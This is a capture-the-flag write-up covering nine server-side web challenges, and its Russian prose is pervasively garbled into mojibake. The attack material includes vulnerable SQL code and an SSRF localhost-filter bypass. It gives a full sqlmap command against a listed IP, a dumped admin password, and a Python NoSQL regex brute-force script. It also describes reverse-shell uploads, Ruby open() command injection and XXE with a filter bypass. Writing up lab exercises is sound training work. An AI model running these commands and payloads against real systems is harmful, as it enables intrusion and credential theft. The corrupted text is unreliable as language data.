## SERVER SIDE WRITEUP

### 1. PASSWORD GENERATOR 1

–í –æ–ø–∏—Å–∞–Ω–∏–∏ —Ç–∞—Å–∫–∞ –¥–æ—Å—Ç—É–ø–µ–Ω –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ —Å–µ—Ä–≤–∏—Å–∞, –∏–∑—É—á–∏–≤ –µ–≥–æ –º–æ–∂–Ω–æ –∑–∞–º–µ—Ç–∏—Ç—å, —á—Ç–æ
–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥ –ª–æ–≥–∏–Ω–∞ –∏ –ø–∞—Ä–æ–ª—è –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –Ω–∏–∫–∞–∫ –Ω–µ —Ñ–∏–ª—å—Ç—Ä—É–µ—Ç—Å—è, –∞ —Ç–∞–∫–∂–µ
–≤–∏–¥–Ω–æ —Å—Ç—Ä—É–∫—Ç—É—Ä—É –∑–∞–ø—Ä–æ—Å–∞ –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö, –ø–æ—ç—Ç–æ–º—É –º–æ–∂–Ω–æ –≤–Ω–µ–¥—Ä–∏—Ç—å sql –∏–Ω—ä–µ–∫—Ü–∏—é.

```
async register(user, pass, role) {
    return new Promise(async (resolve, reject) => {
        try {
            let query = `INSERT INTO users (role, username, password) VALUES ('${role}', '${user}', '${pass}')`;
```

![](assets/sql_passgen1.png)

–ò –∑–∞–ª–æ–≥–∏–Ω–∏–≤—à–∏—Å—å –ø–æ–¥ —ç—Ç–∏–º–∏ —É—á–µ—Ç–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏ –ø–æ–ª—É—á–∞–µ–º —Ñ–ª–∞–≥

`deteact{4804ea3c290391280973c65db196f8d0}`

### 2. PASSWORD GENERATOR 2

–ò–∑—É—á–∞—è —Å–∞–π—Ç –º–æ–∂–Ω–æ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å, —á—Ç–æ –∑–∞–ø—Ä–æ—Å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è GET –∑–∞–ø—Ä–æ—Å–æ–º –Ω–∞
/secureregister, –∏ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –º–æ–∂–Ω–æ —Ç–æ–ª—å–∫–æ —Å –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞.

–ü—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –∫ /api/password –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –ø–æ–ª–µ endpoint –∫ –∫–æ—Ç–æ—Ä–æ–º—É —Å–µ—Ä–≤–µ—Ä –¥–µ–ª–∞–µ—Ç GET –∑–∞–ø—Ä–æ—Å
–ø–æ –∞–¥—Ä–µ—Å—É /keygen. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∞—Ç–∞–∫—É SSRF.

–§–∏–ª—å—Ç—Ä–∞—Ü–∏—é localhost –∏ 127.0.0.1
–º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏ —Å –ø–æ–º–æ—â—å—é –∞–¥—Ä–µ—Å–∞ 127.2.2.2, –∞ –º—É—Å–æ—Ä –æ—Ç–±—Ä–æ—Å–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–º –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º.
–ü—Ä–∏–º–µ–Ω–∏–≤ —É—è–∑–≤–∏–º–æ—Å—Ç—å mass assignment –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º—Å—è –∫–∞–∫ –∞–¥–º–∏–Ω.

![](assets/ssrf_passgen2.png)
–ó–∞–ª–æ–≥–∏–Ω–∏–≤—à–∏—Å—å, –ø–æ–ª—É—á–∞–µ–º —Ñ–ª–∞–≥

`deteact{0d4db1d1ef5c63f7bc124979c11c3476}`

### 3. PRIVATE DATA

–ü—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–≤ —Å–∞–π—Ç —Å –ø–æ–º–æ—â—å—é wpscan –∑–∞–º–µ—Ç–∏–º, —á—Ç–æ –Ω–∞ —Å–∞–π—Ç–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —É—Å—Ç–∞—Ä–µ–≤—à–∏–π –ø–ª–∞–≥–∏–Ω
wp-statistics

```angular2html

[32m[+][0m wp-statistics
 | Location: http://79.143.25.24:8157/wp-content/plugins/wp-statistics/
 | Last Updated: 2023-03-09T12:23:00.000Z
 | [33m[!][0m The version is out of date, the latest version is 14.0.2
```

–í –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –Ω–∞–π–¥–µ–º, —á—Ç–æ –¥–∞–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è –ø–ª–∞–≥–∏–Ω–∞ –ø–æ–¥–≤–µ—Ä–∂–µ–Ω–∞ sql –∏–Ω—ä–µ–∫—Ü–∏–∏.

–¢–∞–∫ –∫–∞–∫ –∏–Ω—ä–µ–∫—Ü–∏—è blind time based, –≤—Ä—É—á–Ω—É—é –ø–µ—Ä–µ–±–∏—Ä–∞—Ç—å –æ—á–µ–Ω—å –¥–æ–ª–≥–æ,
–ø–æ—ç—Ç–æ–º—É –∏—Å–ø–æ–ª—å–∑—É—è —Å –ø–æ–º–æ—â—å—é sqlmap –ø—Ä–æ—á–∏—Ç–∞–µ–º –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö —Å–µ—Ä–≤–µ—Ä–∞:

`sqlmap -u "http://79.143.25.24:8157/wp-admin/admin.php?ID=1&page=wps_pages_page&type=1" --techniqu=T --dbms="mysql" -p "ID" -b --tables -D wordpress`

–ò –≤ —Ç–∞–±–ª–∏—Ü–µ users_admin –Ω–∞–π–¥–µ–º —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞

```angular2html
+----+-------+--------------------+
| ID | login | password           |
+----+-------+--------------------+
| 1  | admin | Jrkvf!mYcLtTZcjW8d |
+----+-------+--------------------+
```

–ó–∞–ª–æ–≥–∏–Ω–∏–≤—à–∏—Å—å –ø–æ–¥ –∞–¥–º–∏–Ω–æ–º —Å—Ä–µ–¥–∏ –ø–æ—Å—Ç–æ–≤ –Ω–∞–π–¥–µ–º –ø–µ—Ä–≤—ã–π —Ñ–ª–∞–≥

`deteact{ce67481ba2558f06be3f4ce71fc67c4f}`

### 4. WordPress Code Execution

–ò—Å–ø–æ–ª—å–∑—É—è —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –∏–∑–º–µ–Ω–∏–º –æ–¥–∏–Ω –∏–∑ php —Ñ–∞–π–ª–æ–≤ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, –∑–∞–≥—Ä—É–∑–∏–≤ –≤ –Ω–µ–≥–æ Reverse Shell.
–ü–æ–¥–Ω–∏–º–µ–º –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–∞ –ª–æ–∫–∞–ª—å–Ω–æ –∏ –æ–±—Ä–∞—Ç–∏–º—Å—è –∫ —Ñ–∞–π–ª—É, –∫–æ–¥ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, –∏ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ.
–ù–∞ —Å–µ—Ä–≤–µ—Ä–µ –Ω–∞–π–¥–µ–º —Ñ–ª–∞–≥:

`deteact{4270a0ad90e239b421d5ec36bcae1c2f}`

### 5. Image Server

–ü–µ—Ä–µ–¥–∞–≤ –≤ image_id —Å—Ç—Ä–æ–∫—É, –ø–æ–ª—É—á–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ, —Å–æ–¥–µ—Ä–∂–∞—â–µ–µ –∏—Å–ø–æ–ª–Ω—è–µ–º—É—é –∫–æ–º–∞–Ω–¥—É.
–í –Ω–µ–º —Å–æ–¥–µ—Ä–∂–∏—Ç—Å—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä __host_debug, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–µ—Ä–µ–¥–∞–Ω –≤ –∑–∞–ø—Ä–æ—Å–µ, –∞ —Ç–∞–∫–∂–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è oldserver:8000.

–û—Ç–±—Ä–æ—Å–∏–≤ –ª–∏—à–Ω—é—é —á–∞—Å—Ç—å –∑–∞–ø—Ä–æ—Å–∞, –ø—Ä–æ—Å–∫–∞–Ω–∏—Ä—É–µ–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –Ω–∞ oldserver –∏ –Ω–∞–π–¥–µ–º —Ñ–∞–π–ª openapi.json

![](assets/oldserver.png)

–í —Ñ–∞–π–ª–µ –Ω–∞–π–¥–µ–º –∞–¥—Ä–µ—Å /test_endpoint –≤ –∫–æ—Ç–æ—Ä—ã–π –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä fname
–° –ø–æ–º–æ—â—å—é —ç—Ç–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –º–æ–∂–Ω–æ –ø—Ä–æ—á–∏—Ç–∞—Ç—å –ª—é–±–æ–π —Ñ–∞–π–ª –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.
–ò–∑—É—á–∏–≤ /etc/passwd, –Ω–∞–π–¥–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å –∏–º–µ–Ω–µ–º flag, –≤ –µ–≥–æ –¥–æ–º–∞—à–Ω–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –≤ —Ñ–∞–π–ª–µ flag.txt –±—É–¥–µ—Ç –ª–µ–∂–∞—Ç—å –Ω–∞—à —Ñ–ª–∞–≥)

`deteact{4a4db41eacd762e1b0bc2f303326df91}`

![](assets/server_flag.png)

### 6. Image Converter

–ü–µ—Ä–µ–¥–∞–≤ –≤ –ø–æ–ª–µ –≤–≤–æ–¥–∞ url "—Å–ª–æ–º–∞–Ω–Ω—É—é" —Å—Å—ã–ª–∫—É, —Å–æ–¥–µ—Ä–∂–∞—â—É—é —Ä–∞–∑–Ω—ã–µ —Å–ø–µ—Ü—Å–∏–º–≤–æ–ª—ã, –ø–æ–ª—É—á–∏–º –æ—à–∏–±–∫—É –æ–±—Ä–∞–±–æ—Ç–∫–∏.
–ò–∑ –æ—à–∏–±–∫–∏ –ø–æ–ª—É—á–∏–º, —á—Ç–æ –ø–µ—Ä–µ–¥–∞–Ω–Ω–∞—è url –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ —Ñ—É–Ω–∫—Ü–∏–∏ open. –ê —Å–∞–º —Å–µ—Ä–≤–µ—Ä –∏—Å–ø–æ–ª—å–∑—É–µ—Ç ruby.

![](assets/open.png)

–í –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –Ω–∞–π–¥–µ–º, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑—É—è —Ñ—É–Ω–∫—Ü–∏—é open –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å RCE –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, –ø–µ—Ä–µ–¥–∞–≤ –ø–æ—Å–ª–µ —Å–∏–º–≤–æ–ª–∞ '|' –Ω–µ–æ–±—Ö–æ–¥–∏–º—É—é –∫–æ–º–∞–Ω–¥—É.
–ó–∞–≥—Ä—É–∑–∏–º –≤ –∫–æ–º–∞–Ω–¥—É reverse shell –ø–æ—Å—Ä–µ–¥—Å—Ç–≤–æ–º ruby, –∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –Ω–∞–π–¥–µ–º —Ñ–ª–∞–≥.

### 7. User API

–¢–µ—Å—Ç–∏—Ä—É—è –≤–æ–∑–º–æ–∂–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏, –æ–±–Ω–∞—Ä—É–∂–∏–º —á—Ç–æ —Å–µ—Ä–≤–µ—Ä –ø–æ–¥–≤–µ—Ä–∂–µ–Ω NoSQL injection.
–ü—Ä–æ–≤–µ—Ä–∏–≤ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —É–≤–∏–¥–∏–º, —á—Ç–æ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - admin, –∞ –ø–∞—Ä–æ–ª—å –∏–º–µ–µ—Ç —Ñ–æ—Ä–º–∞—Ç —Ñ–ª–∞–≥–∞ –∏ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å deteact{
–ù–∞–ø–∏—à–µ–º —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ø–æ–¥–±–æ—Ä–∞ –æ—Å—Ç–∞–≤—à–µ–π—Å—è —á–∞—Å—Ç–∏ –ø–∞—Ä–æ–ª—è

```angular2html
url = "http://45.131.97.54:3000/login"
headers = {"Host": "45.131.97.54:3000", "Content-Type": "application/json"}
possible_chars = list(string.ascii_letters)[:26] + list(string.digits)


def get_password():
    params = {"username": {"$eq":"admin"}, "password": {"$regex":"^deteact{" } }
    password = "^deteact{"
    while True:
        for c in possible_chars:
            params["password"]["$regex"] = password + c
            string = json.dumps(params)
            print(string, end=' ')
            pr = requests.post(url, data=string, headers=headers)
            print(pr.text)
            if "ess" in pr.text:
                password += c
                break
        else:
            break
    print(password)
```

–ò—Å–ø–æ–ª–Ω–∏–≤ —Å–∫—Ä–∏–ø—Ç –ø–æ–ª—É—á–∏–º —Ñ–ª–∞–≥ –æ—Ç —Ç–∞—Å–∫–∞

![](assets/userapi.png)

`deteact{6b78aa0e40fefcabea1cf8076cac7204}`

### 8. AI Coder

–í—ã–ø–æ–ª–Ω–∏–≤ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é xml –∏–Ω—ä–µ–∫—Ü–∏—é –æ–±—Ä–∞—Ç–∏–º—Å—è –∫ —Ñ–∞–π–ª—É /etc/passwd –≤ –∫–æ—Ç–æ—Ä–æ–º –∏ –Ω–∞–π–¥–µ–º —Ñ–ª–∞–≥.

### 9. AI Coder V2

–ó–∞–º–µ—Ç–∏–º —á—Ç–æ –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–π –Ω–∞–º–∏ email –≤—ã–≤–æ–¥–∏—Ç—Å—è –æ—Ç–≤–µ—Ç–æ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, –ø–æ–ª—É—á–∞–µ—Ç—Å—è —á—Ç–æ –ø–æ–ª–µ –ø–æ–¥–≤–µ—Ä–∂–µ–Ω–æ xml –∏–Ω—ä–µ–∫—Ü–∏–∏
–ù–∞ —Å–µ—Ä–≤–µ—Ä–µ —Å—Ç–æ–∏—Ç —Ñ–∏–ª—å—Ç—Ä, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∑–∞–ø—Ä–æ—Å, –µ—Å–ª–∏ –≤ –Ω–µ–º —Å–æ–¥–µ—Ä–∂–∞—Ç—Å—è –∫–ª—é—á–µ–≤—ã–µ —Å–ª–æ–≤–∞ `xml` `file` `system` `localhost` `127.` `0.0.0.0`

–ü—Ä–æ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –Ω–∞–π–¥–µ–º –∞–¥—Ä–µ—Å /secret, –¥–æ—Å—Ç—É–ø–Ω—ã–π —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ —Å –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞
–ó–∞–º–µ–Ω–∏–≤ SYSTEM –Ω–∞ PUBLIC, –≤—ã–ø–æ–ª–Ω–∏–º SSRF –Ω–∞ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π —Å–µ—Ä–≤–µ—Ä, –≤ –∫–æ—Ç–æ—Ä–æ–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏–º –∑–∞–ø—Ä–æ—Å –Ω–∞ `http://localhost/secret`
–ò –≤—ã–ø–æ–ª–Ω–∏–≤ xml –∏–Ω—ä–µ–∫—Ü–∏—é, –ø–æ–ª—É—á–∏–º –≤ –ø–æ–ª–µ email —Ñ–ª–∞–≥.

![](assets/coder2.png)
